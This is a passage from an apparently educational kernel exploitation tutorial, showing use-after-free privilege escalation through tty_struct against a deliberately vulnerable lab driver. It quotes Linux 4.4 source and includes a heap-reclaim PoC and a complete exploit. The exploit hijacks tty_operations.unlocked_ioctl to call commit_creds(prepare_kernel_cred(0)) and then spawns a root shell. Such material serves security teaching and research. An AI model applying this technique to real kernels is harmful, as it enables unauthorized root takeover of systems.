07.Use-After-Free(UAF) (feat.tty_struct)

  • In 06.Use-After-Free(UAF) (feat.struct cred), we escalated privileges by corrupting a newly allocated process's struct cred.
    • In this chapter, we explore privilege escalation by corrupting struct tty_struct via UAF.

Use-After-Free(UAF)​

  • Refer to first-fit (Use-After-Free).
CWE-416: Use After Free
  • https://cwe.mitre.org/data/definitions/416.html
  • https://www.cvedetails.com/cwe-details/416/cwe.html
  • https://www.cvedetails.com/vulnerability-list/cweid-416/vulnerabilities.html

kmalloc, kfree​

  • Refer to 06.Use-After-Free(UAF) (feat.struct cred) - kmalloc, kfree.

struct tty_struct​

  • struct tty_struct is maintained by the kernel TTY core to track the state of a TTY port.
    • The *ops field points to struct tty_operations, which contains function pointers handling TTY operations.
  • Exploiting *ops:
    • Construct a fake struct tty_operations array in user space.
    • Set desired operation handlers (e.g. ioctl / unlocked_ioctl) to point to a user-mode privilege escalation payload (get_root).
    • Overwrite tty_struct->ops via UAF with the user-space address of the fake tty_operations table.
    • Trigger the hijacked operation by calling ioctl() on the opened /dev/ptmx file descriptor.

ptmx​

  • When /dev/ptmx is opened, ptmx_open() invokes tty_init_dev():
https://elixir.bootlin.com/linux/v4.4/source/drivers/tty/pty.c#L734
static int ptmx_open(struct inode *inode, struct file *filp)
{
	struct tty_struct *tty;
	struct inode *slave_inode;
	int retval;
	int index;

	nonseekable_open(inode, filp);

	/* We refuse fsnotify events on ptmx, since it's a shared resource */
	filp->f_mode |= FMODE_NONOTIFY;

	retval = tty_alloc_file(filp);
	if (retval)
		return retval;

	/* find a device that is not in use. */
	mutex_lock(&devpts_mutex);
	index = devpts_new_index(inode);
	if (index < 0) {
		retval = index;
		mutex_unlock(&devpts_mutex);
		goto err_file;
	}

	mutex_unlock(&devpts_mutex);

	mutex_lock(&tty_mutex);
	tty = tty_init_dev(ptm_driver, index);

	if (IS_ERR(tty)) {
		retval = PTR_ERR(tty);
		goto out;
	}

	/* The tty returned here is locked so we can safely
	   drop the mutex */
	mutex_unlock(&tty_mutex);

https://elixir.bootlin.com/linux/v4.4/source/drivers/tty/tty_io.c#L1506
struct tty_struct *tty_init_dev(struct tty_driver *driver, int idx)
{
	struct tty_struct *tty;
	int retval;

	if (!try_module_get(driver->owner))
		return ERR_PTR(-ENODEV);

	tty = alloc_tty_struct(driver, idx);
	if (!tty) {
		retval = -ENOMEM;
		goto err_module_put;
	}

	tty_lock(tty);
	retval = tty_driver_install_tty(driver, tty);

  • alloc_tty_struct() allocates memory for struct tty_struct via kzalloc(sizeof(*tty), GFP_KERNEL):
    • Because sizeof(struct tty_struct) is 736 (0x2e0) bytes, allocating and freeing a 736-byte chunk allows alloc_tty_struct to reclaim that exact freed chunk.
https://elixir.bootlin.com/linux/v4.4/source/drivers/tty/tty_io.c#L3105
struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
{
	struct tty_struct *tty;

	tty = kzalloc(sizeof(*tty), GFP_KERNEL);
	if (!tty)
		return NULL;

	kref_init(&tty->kref);
	tty->magic = TTY_MAGIC;
	tty_ldisc_init(tty);
	tty->session = NULL;
	tty->pgrp = NULL;

Proof of Concept​

PoC code​

  • Validate the UAF heap reclaim with tty_struct:
    • Open /dev/chardev0.
    • Allocate a 736-byte heap chunk via ioctl(fd1, KMALLOC, 736).
    • Free the chunk via ioctl(fd1, KFREE).
    • Open /dev/ptmx to trigger allocation of struct tty_struct.
    • Read from fd1 to inspect the newly created tty_struct contents through the dangling pointer.
PoC-3.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include "chardev.h"

#define DEVICE_FILE_NAME "/dev/chardev0"   
#define HEAP_SIZE 736

int main(){

    int fd1,fd_tty,i,j;
    char info[HEAP_SIZE];

    if ((fd1 = open(DEVICE_FILE_NAME, O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    ioctl(fd1, KMALLOC, HEAP_SIZE);
    ioctl(fd1, KFREE);

    if ((fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    memset(info, 0, HEAP_SIZE);
    read(fd1, info, HEAP_SIZE - 1);
 
    for (i = 0; i < 46; i++)
    {
        for (j = 0; j < 16; j++) printf("%02x ", info[i*16+j] & 0xff);
        printf(" | ");
        for (j = 0; j < 16; j++) printf("%c", info[i*16+j] & 0xff);
        printf("\n");
    }

    if (close(fd1) != 0){
        printf("Cannot close.\n");
    }

    if (close(fd_tty) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}

Exploit method​

  • Exploitation workflow using tty_struct->ops:
note
  • Allocate a 736-byte chunk via KMALLOC (0x2e0).
  • Free the chunk via KFREE.
  • Open /dev/ptmx to place a struct tty_struct into the freed memory block.
  • Construct a fake struct tty_operations array in user space with fake_ops[12] (unlocked_ioctl) pointing to get_root().
  • Read tty_struct header from fd1, replace tty_struct->ops (offset 24) with the address of fake_ops, and write back via write(fd1, ...).
  • Call ioctl(fd_tty, 0, 0) to trigger the hijacked unlocked_ioctl pointer, escalating privileges to root.
  • Launch a root shell via execl("/bin/sh", "sh", NULL).

Exploit code​

Exploit Code - exploit-3.c
//gcc -masm=intel -static -o exploit-3 exploit-3.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include "chardev.h"

#define DEVICE_FILE_NAME "/dev/chardev0"   

void *(*prepare_kernel_cred)(void *) ;
int (*commit_creds)(void *) ;
void *fake_tty_operations[30];
 
void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

void *kallsym_getaddr(char *name)
{
    FILE *fp;
    void *addr;
    char sym[512];
  
    fp = fopen("/proc/kallsyms", "r");
    while (fscanf(fp, "%p %*c %512s\n", &addr, sym) > 0) {
        if (strcmp(sym, name) == 0) {
            break;
        }else{
            addr = NULL;
        }
    }
    fclose(fp);
    return addr;
}
  
int main(){
    int i = 0, j;

    //Find the addresss of "prepare_kernel_cred()"
    prepare_kernel_cred = kallsym_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred == 0)
    {
        printf("failed to get prepare_kernel_cred addresss\n");
        return 0;
    }
 
    //Find the addresss of "commit_creds()"
    commit_creds = kallsym_getaddr("commit_creds");
    if(commit_creds == 0)
    {
        printf("failed to get commit_creds addresss\n");
        return 0;
    }
 
    printf("prepare_kernel_cred = %p\n", prepare_kernel_cred);
    printf("commit_creds = %p\n", commit_creds);

    //Set the fake "tty_operations" structure. 
    for(i = 0; i < 30; i++)
    {
	fake_tty_operations[i] = 0; 
    }

    //Save the addresss of get_root() function in "tty_operations.unlocked_ioctl".
    fake_tty_operations[12] = (size_t)get_root;

    int fd1;
    if ((fd1 = open(DEVICE_FILE_NAME, O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    ioctl(fd1, KMALLOC, 0x2e0);
    ioctl(fd1, KFREE);

    int fd_tty;
    if ((fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    //Overwrite the addresss of the fake "file_operations" in the "tty_struct.ops".
    size_t fake_tty_struct[4] = {0};
    read(fd1, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd1,fake_tty_struct, 32);

    //Call the ioctl(ioctl -> unlocked_ioctl -> get_root)
    ioctl(fd_tty, 0, 0);

    printf("getuid() = %d\n", getuid());
    execl("/bin/sh", "sh", NULL);  

    if (close(fd1) != 0){
        printf("Cannot close.\n");
    }

    if (close(fd_tty) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
